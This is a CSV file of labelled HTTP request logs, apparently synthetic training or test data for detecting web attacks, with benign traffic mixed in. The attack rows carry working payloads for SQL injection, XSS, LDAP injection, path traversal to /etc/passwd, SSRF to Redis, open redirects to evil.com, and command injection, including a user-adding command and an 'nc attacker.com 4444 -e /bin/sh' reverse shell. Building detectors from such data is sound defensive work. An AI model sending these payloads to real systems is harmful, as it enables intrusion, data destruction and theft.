timestamp,source_ip,dest_ip,method,host,path,query_string,full_url,user_agent,attack_type,is_attack
2026-04-07T15:15:37.825497,172.16.0.19,172.16.0.73,GET,shop.example.com,/return,return=%2F%2Fevil.com%2Fpath,http://shop.example.com/return?return=%2F%2Fevil.com%2Fpath,nuclei,open_redirect,1
2026-04-07T14:26:28.707814,10.0.0.80,192.168.1.175,GET,example.com,/settings,,https://example.com/settings,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:57:38.055569,172.16.0.225,192.168.1.132,GET,192.168.1.100,/api/users,q=%27%20UNION%20SELECT%20NULL--,https://192.168.1.100/api/users?q=%27%20UNION%20SELECT%20NULL--,PostmanRuntime/7.35.0,sql_injection,1
2026-04-07T13:35:20.189474,172.16.0.174,10.0.0.124,GET,api.example.com,/directory,filter=%2A%28%29%7C%2526%27,http://api.example.com/directory?filter=%2A%28%29%7C%2526%27,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",ldap_injection,1
2026-04-07T15:34:21.188777,192.168.1.254,10.0.0.104,GET,shop.example.com,/news,,http://shop.example.com/news,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:26:28.948622,10.0.0.12,192.168.1.149,POST,webapp.internal,/search,category=' UNION SELECT NULL--,https://webapp.internal/search?category=' UNION SELECT NULL--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",sql_injection,1
2026-04-07T14:52:35.127473,10.0.0.50,172.16.0.70,GET,webapp.internal,/faq,format=json&brand=apple,http://webapp.internal/faq?format=json&brand=apple,python-requests/2.31.0,benign,0
2026-04-07T13:54:08.528909,192.168.1.248,172.16.0.198,HEAD,example.com,/register,sort=asc,https://example.com/register?sort=asc,curl/8.4.0,benign,0
2026-04-07T14:25:05.368815,10.0.0.5,192.168.1.188,GET,shop.example.com,/api/orders,filter=recent&page=1,http://shop.example.com/api/orders?filter=recent&page=1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:26:17.696242,192.168.1.43,172.16.0.206,GET,example.com,/blog/post/1,type=product&sort=asc,http://example.com/blog/post/1?type=product&sort=asc,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:56:00.234082,172.16.0.79,172.16.0.11,GET,secure.example.com,/faq,from=2024-01-01,https://secure.example.com/faq?from=2024-01-01,PostmanRuntime/7.35.0,benign,0
2026-04-07T15:20:51.973248,192.168.1.221,192.168.1.211,HEAD,secure.example.com,/login,,http://secure.example.com/login,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:54:28.507325,10.0.0.232,172.16.0.219,HEAD,webapp.internal,/blog,,https://webapp.internal/blog,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T15:27:32.994848,10.0.0.3,192.168.1.147,GET,admin.example.com,/search,filter=admin%29%28%26%29,http://admin.example.com/search?filter=admin%29%28%26%29,Nmap Scripting Engine,ldap_injection,1
2026-04-07T13:54:39.270102,172.16.0.52,192.168.1.231,GET,test-app.local,/api/execute,host=test%26%20net%20user%20hacker%20hacker123%20%2Fadd,http://test-app.local/api/execute?host=test%26%20net%20user%20hacker%20hacker123%20%2Fadd,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",command_injection,1
2026-04-07T14:05:21.538907,10.0.0.99,172.16.0.17,POST,10.0.0.50,/api/message,"query=""-alert(1)-""","http://10.0.0.50/api/message?query=""-alert(1)-""","Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",xss,1
2026-04-07T13:26:20.088008,192.168.1.9,192.168.1.168,POST,secure.example.com,/faq,,https://secure.example.com/faq,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:13:50.568622,192.168.1.54,192.168.1.147,GET,shop.example.com,/redir,url=https%3A%2F%2Fevil.com%40legitimate.com,http://shop.example.com/redir?url=https%3A%2F%2Fevil.com%40legitimate.com,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",open_redirect,1
2026-04-07T13:50:54.953922,172.16.0.168,172.16.0.230,GET,api.example.com,/terms,page=1&from=2024-01-01,http://api.example.com/terms?page=1&from=2024-01-01,python-requests/2.31.0,benign,0
2026-04-07T14:04:09.675578,192.168.1.217,192.168.1.153,GET,secure.example.com,/css/style.css,,http://secure.example.com/css/style.css,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:58:44.584199,172.16.0.134,172.16.0.88,POST,admin.example.com,/js/main.js,from=2024-01-01&user=john,http://admin.example.com/js/main.js?from=2024-01-01&user=john,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:28:27.479445,192.168.1.123,10.0.0.236,GET,example.com,/search,,https://example.com/search,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T15:02:32.633747,192.168.1.10,192.168.1.175,GET,example.com,/redirect,next=http%3A%2F%2Fevil.com,http://example.com/redirect?next=http%3A%2F%2Fevil.com,curl/8.4.0,open_redirect,1
2026-04-07T15:14:45.924763,10.0.0.99,10.0.0.137,GET,test-app.local,/api/v1/status,,https://test-app.local/api/v1/status,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:29:33.744359,192.168.1.142,172.16.0.172,HEAD,10.0.0.50,/events,,http://10.0.0.50/events,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T15:30:37.880080,172.16.0.18,10.0.0.173,POST,example.com,/profile,name=<img src=1 onerror=alert(1)>,https://example.com/profile?name=<img src=1 onerror=alert(1)>,nikto/2.5.0,xss,1
2026-04-07T14:26:24.384989,10.0.0.238,10.0.0.229,GET,example.com,/admin,"username=' AND BENCHMARK(10000000,SHA1('test'))--","https://example.com/admin?username=' AND BENCHMARK(10000000,SHA1('test'))--","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",sql_injection,1
2026-04-07T15:27:00.799356,192.168.1.35,192.168.1.101,POST,secure.example.com,/news,,http://secure.example.com/news,curl/8.4.0,benign,0
2026-04-07T14:15:21.970900,192.168.1.252,172.16.0.46,GET,10.0.0.50,/terms,,https://10.0.0.50/terms,python-requests/2.31.0,benign,0
2026-04-07T14:55:59.574424,172.16.0.12,10.0.0.111,GET,10.0.0.50,/download/php://filter/convert.base64-encode/resource=index.php,,http://10.0.0.50/download/php://filter/convert.base64-encode/resource=index.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T15:02:31.167413,192.168.1.93,192.168.1.125,GET,10.0.0.50,/lookup,filter=admin%29%28%26%29,http://10.0.0.50/lookup?filter=admin%29%28%26%29,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,ldap_injection,1
2026-04-07T14:22:19.796300,192.168.1.37,192.168.1.73,HEAD,webapp.internal,/api/products,,http://webapp.internal/api/products,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:31:04.678872,192.168.1.226,172.16.0.40,POST,test-app.local,/profile,status=active&type=product&q=laptop,http://test-app.local/profile?status=active&type=product&q=laptop,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:46:15.705847,192.168.1.105,172.16.0.3,GET,admin.example.com,/about,,http://admin.example.com/about,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:55:31.983440,172.16.0.141,192.168.1.229,GET,admin.example.com,/proxy,fetch=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,http://admin.example.com/proxy?fetch=gopher%3A%2F%2Flocalhost%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a,curl/8.4.0,ssrf,1
2026-04-07T13:59:15.597960,192.168.1.136,10.0.0.91,POST,shop.example.com,/help,,http://shop.example.com/help,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T15:02:45.443487,10.0.0.239,10.0.0.21,GET,admin.example.com,/products,user=%27%20OR%201%3D1%23,http://admin.example.com/products?user=%27%20OR%201%3D1%23,nikto/2.5.0,sql_injection,1
2026-04-07T13:42:13.531981,172.16.0.33,172.16.0.194,HEAD,shop.example.com,/terms,sort=asc&page=1,http://shop.example.com/terms?sort=asc&page=1,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T14:59:03.867482,10.0.0.83,192.168.1.165,POST,test-app.local,/settings,,http://test-app.local/settings,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:32:06.509586,192.168.1.156,10.0.0.28,GET,192.168.1.100,/directory,uid=admin%29%28%21%28%26%281%3D0,https://192.168.1.100/directory?uid=admin%29%28%21%28%26%281%3D0,burpsuite,ldap_injection,1
2026-04-07T15:29:21.849511,192.168.1.100,192.168.1.83,POST,webapp.internal,/news,from=2024-01-01&view=list,https://webapp.internal/news?from=2024-01-01&view=list,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T15:20:03.388838,10.0.0.6,192.168.1.174,HEAD,api.example.com,/blog/category/tech,sort=asc&lang=en&user=john,http://api.example.com/blog/category/tech?sort=asc&lang=en&user=john,curl/8.4.0,benign,0
2026-04-07T14:46:04.756980,10.0.0.25,10.0.0.48,GET,webapp.internal,/download/..%255c..%255c..%255cetc/passwd,,http://webapp.internal/download/..%255c..%255c..%255cetc/passwd,curl/8.4.0,path_traversal,1
2026-04-07T14:36:50.467751,192.168.1.230,192.168.1.153,GET,secure.example.com,/blog,format=json&id=123,http://secure.example.com/blog?format=json&id=123,python-requests/2.31.0,benign,0
2026-04-07T14:41:14.392801,172.16.0.202,172.16.0.44,GET,admin.example.com,/ping,command=test; ls -la,https://admin.example.com/ping?command=test; ls -la,nuclei,command_injection,1
2026-04-07T14:50:19.756117,10.0.0.210,10.0.0.188,POST,webapp.internal,/products,"category=' AND BENCHMARK(10000000,SHA1('test'))--","http://webapp.internal/products?category=' AND BENCHMARK(10000000,SHA1('test'))--",python-requests/2.31.0,sql_injection,1
2026-04-07T13:51:03.356913,172.16.0.87,10.0.0.157,GET,example.com,/image,url=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http://example.com/image?url=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,nikto/2.5.0,ssrf,1
2026-04-07T14:51:28.979226,192.168.1.73,172.16.0.188,POST,secure.example.com,/api/message,input=<marquee onstart=alert(1)>,https://secure.example.com/api/message?input=<marquee onstart=alert(1)>,wfuzz/3.1.0,xss,1
2026-04-07T13:44:22.020551,192.168.1.79,172.16.0.95,GET,admin.example.com,/ldap,user=admin%2A,http://admin.example.com/ldap?user=admin%2A,nikto/2.5.0,ldap_injection,1
2026-04-07T14:47:55.619688,10.0.0.160,192.168.1.146,GET,admin.example.com,/ldap,username=x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y,http://admin.example.com/ldap?username=x%27%20or%20name%28%29%3D%27username%27%20or%20%27x%27%3D%27y,dirbuster,ldap_injection,1
2026-04-07T14:02:28.187117,172.16.0.243,172.16.0.186,GET,192.168.1.100,/logout,,http://192.168.1.100/logout,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:47:54.664463,192.168.1.29,192.168.1.70,POST,secure.example.com,/terms,,http://secure.example.com/terms,curl/8.4.0,benign,0
2026-04-07T13:35:19.902661,192.168.1.226,10.0.0.140,GET,api.example.com,/blog,brand=apple,http://api.example.com/blog?brand=apple,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:28:13.750344,10.0.0.141,172.16.0.139,POST,example.com,/images/logo.png,filter=recent&brand=apple,http://example.com/images/logo.png?filter=recent&brand=apple,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T15:25:12.656397,172.16.0.109,192.168.1.193,GET,example.com,/read,file=../../../etc/passwd,https://example.com/read?file=../../../etc/passwd,burpsuite,path_traversal,1
2026-04-07T13:58:50.374083,192.168.1.21,192.168.1.215,GET,example.com,/login,user=1%27%20AND%201%3D1--,https://example.com/login?user=1%27%20AND%201%3D1--,dirbuster,sql_injection,1
2026-04-07T15:13:55.997333,192.168.1.171,172.16.0.22,GET,192.168.1.100,/images/logo.png,sort=asc,http://192.168.1.100/images/logo.png?sort=asc,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:42:52.785034,10.0.0.99,192.168.1.123,GET,webapp.internal,/contact,to=2024-12-31&q=laptop,http://webapp.internal/contact?to=2024-12-31&q=laptop,curl/8.4.0,benign,0
2026-04-07T15:23:26.621974,10.0.0.70,172.16.0.107,GET,test-app.local,/api/v1/status,brand=apple&limit=10,http://test-app.local/api/v1/status?brand=apple&limit=10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:07:44.938270,172.16.0.240,10.0.0.113,GET,api.example.com,/products,brand=apple&status=active,https://api.example.com/products?brand=apple&status=active,curl/8.4.0,benign,0
2026-04-07T14:38:58.839246,192.168.1.11,172.16.0.151,GET,webapp.internal,/privacy,,http://webapp.internal/privacy,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:47:50.713485,172.16.0.63,172.16.0.145,GET,api.example.com,/settings,q=laptop&lang=en,http://api.example.com/settings?q=laptop&lang=en,python-requests/2.31.0,benign,0
2026-04-07T13:59:40.390469,10.0.0.219,172.16.0.198,GET,10.0.0.50,/js/main.js,,http://10.0.0.50/js/main.js,python-requests/2.31.0,benign,0
2026-04-07T14:51:21.750903,172.16.0.208,10.0.0.249,HEAD,webapp.internal,/events,,https://webapp.internal/events,curl/8.4.0,benign,0
2026-04-07T14:49:57.503764,172.16.0.128,10.0.0.14,POST,example.com,/products,user=1' ORDER BY 1--,http://example.com/products?user=1' ORDER BY 1--,masscan/1.3,sql_injection,1
2026-04-07T14:42:26.007803,10.0.0.247,192.168.1.159,GET,test-app.local,/cart,,http://test-app.local/cart,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:17:58.454988,192.168.1.121,172.16.0.104,HEAD,192.168.1.100,/about,,http://192.168.1.100/about,python-requests/2.31.0,benign,0
2026-04-07T14:52:34.768011,10.0.0.244,172.16.0.39,HEAD,admin.example.com,/search,,http://admin.example.com/search,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T15:10:34.885028,192.168.1.186,192.168.1.155,POST,webapp.internal,/api/message,"name=<math><maction actiontype=""statusline#http://attacker.com"">","http://webapp.internal/api/message?name=<math><maction actiontype=""statusline#http://attacker.com"">",python-requests/2.31.0,xss,1
2026-04-07T14:31:58.892253,192.168.1.246,172.16.0.251,GET,example.com,/goto,next=javascript%3Aalert%28document.domain%29,https://example.com/goto?next=javascript%3Aalert%28document.domain%29,sqlmap/1.7.12#dev,open_redirect,1
2026-04-07T14:28:01.026142,192.168.1.73,10.0.0.155,POST,webapp.internal,/blog/category/tech,status=active&lang=en,https://webapp.internal/blog/category/tech?status=active&lang=en,PostmanRuntime/7.35.0,benign,0
2026-04-07T15:28:56.345316,172.16.0.29,10.0.0.58,POST,admin.example.com,/search,"query=""-alert(1)-""","http://admin.example.com/search?query=""-alert(1)-""","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",xss,1
2026-04-07T13:28:38.108904,172.16.0.91,192.168.1.183,GET,secure.example.com,/settings,,http://secure.example.com/settings,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:53:13.108157,172.16.0.71,172.16.0.4,GET,10.0.0.50,/news,format=json,https://10.0.0.50/news?format=json,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:38:04.091373,172.16.0.144,172.16.0.16,HEAD,api.example.com,/help,format=json,http://api.example.com/help?format=json,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:07:58.893595,10.0.0.202,172.16.0.78,GET,shop.example.com,/privacy,user=john&q=laptop&order=name,https://shop.example.com/privacy?user=john&q=laptop&order=name,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:02:53.915322,192.168.1.99,192.168.1.54,POST,api.example.com,/settings,,http://api.example.com/settings,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T15:06:01.404849,172.16.0.194,10.0.0.101,GET,10.0.0.50,/admin,search=' HAVING 1=1--,http://10.0.0.50/admin?search=' HAVING 1=1--,burpsuite,sql_injection,1
2026-04-07T15:15:01.640647,172.16.0.52,10.0.0.54,GET,webapp.internal,/comment,name=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,http://webapp.internal/comment?name=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),xss,1
2026-04-07T15:16:23.921080,172.16.0.223,192.168.1.105,GET,example.com,/load,file=..%c0%af..%c0%af..%c0%afetc/passwd,https://example.com/load?file=..%c0%af..%c0%af..%c0%afetc/passwd,nikto/2.5.0,path_traversal,1
2026-04-07T14:24:08.525577,10.0.0.108,172.16.0.139,POST,secure.example.com,/images/logo.png,format=json&q=laptop&limit=10,http://secure.example.com/images/logo.png?format=json&q=laptop&limit=10,curl/8.4.0,benign,0
2026-04-07T13:45:42.446337,192.168.1.243,10.0.0.120,GET,admin.example.com,/terms,format=json&to=2024-12-31,http://admin.example.com/terms?format=json&to=2024-12-31,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:40:09.859816,192.168.1.124,10.0.0.93,GET,webapp.internal,/lookup,cmd=test%7C%20nc%20attacker.com%204444%20-e%20%2Fbin%2Fsh,http://webapp.internal/lookup?cmd=test%7C%20nc%20attacker.com%204444%20-e%20%2Fbin%2Fsh,nikto/2.5.0,command_injection,1
2026-04-07T15:12:04.123919,172.16.0.84,192.168.1.88,POST,192.168.1.100,/login,"q=' AND BENCHMARK(10000000,SHA1('test'))--","http://192.168.1.100/login?q=' AND BENCHMARK(10000000,SHA1('test'))--",nuclei,sql_injection,1
2026-04-07T15:13:35.307511,172.16.0.14,192.168.1.57,GET,shop.example.com,/redirect,target=%2F%2F%2Fevil.com,http://shop.example.com/redirect?target=%2F%2F%2Fevil.com,nikto/2.5.0,open_redirect,1
2026-04-07T14:31:13.698920,10.0.0.253,192.168.1.205,POST,webapp.internal,/login,user=%27%29%20OR%20%28%271%27%3D%271,http://webapp.internal/login?user=%27%29%20OR%20%28%271%27%3D%271,sqlmap/1.7.12#dev,sql_injection,1
2026-04-07T13:38:50.439846,192.168.1.152,172.16.0.81,GET,10.0.0.50,/,view=list&id=123,http://10.0.0.50/?view=list&id=123,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:16:02.884712,172.16.0.107,10.0.0.242,HEAD,secure.example.com,/index.html,,http://secure.example.com/index.html,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:36:20.342140,10.0.0.3,192.168.1.241,GET,secure.example.com,/about,brand=apple&status=active&to=2024-12-31,http://secure.example.com/about?brand=apple&status=active&to=2024-12-31,PostmanRuntime/7.35.0,benign,0
2026-04-07T15:34:02.123087,192.168.1.158,10.0.0.115,GET,secure.example.com,/events,type=product&view=list,https://secure.example.com/events?type=product&view=list,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
